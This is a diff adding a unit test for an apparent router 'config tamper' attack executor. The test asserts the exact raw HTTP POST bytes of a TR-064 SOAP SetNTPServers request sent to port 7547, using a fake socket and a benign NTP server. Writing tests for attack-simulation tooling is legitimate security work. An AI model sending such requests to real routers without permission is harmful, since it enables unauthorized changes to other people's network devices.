@@ -62,6 +62,41 @@ def test_config_tamper_executor_sends_request_and_returns_status(monkeypatch) ->
     )
 
 
+def test_config_tamper_executor_sends_custom_content_type_and_soap_action(monkeypatch) -> None:
+    fake_socket = _FakeTcpSocket(recv_data=b'HTTP/1.1 200 OK\r\n\r\n')
+    monkeypatch.setattr(impact.socket, 'create_connection', lambda address, timeout: fake_socket)
+
+    soap_body = (
+        '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
+        '<s:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1">'
+        '<NewNTPServer1>pool.ntp.org</NewNTPServer1></u:SetNTPServers></s:Body></s:Envelope>'
+    )
+    device = DeviceConfig(name='dev1', ip='192.168.1.1')
+    attack = ConfigTamperAttackConfig(
+        name='config_tamper_soap',
+        label='Config_Tamper_SOAP',
+        port=7547,
+        path='/UD/act?1',
+        content_type='text/xml; charset="utf-8"',
+        soap_action='urn:dslforum-org:service:Time:1#SetNTPServers',
+        body=soap_body,
+    )
+    executor = impact.ConfigTamperExecutor(attack=attack)
+
+    executor.execute(device=device)
+
+    body_bytes = soap_body.encode()
+    assert fake_socket.sent == (
+        b'POST /UD/act?1 HTTP/1.1\r\n'
+        b'Host: 192.168.1.1\r\n'
+        b'Content-Type: text/xml; charset="utf-8"\r\n'
+        b'SOAPAction: "urn:dslforum-org:service:Time:1#SetNTPServers"\r\n'
+        + f'Content-Length: {len(body_bytes)}\r\n'.encode()
+        + b'Connection: close\r\n\r\n'
+        + body_bytes
+    )
+
+
 def test_config_tamper_executor_returns_unreachable_on_connection_failure(monkeypatch) -> None:
     def refuse(address, timeout):
         raise ConnectionRefusedError
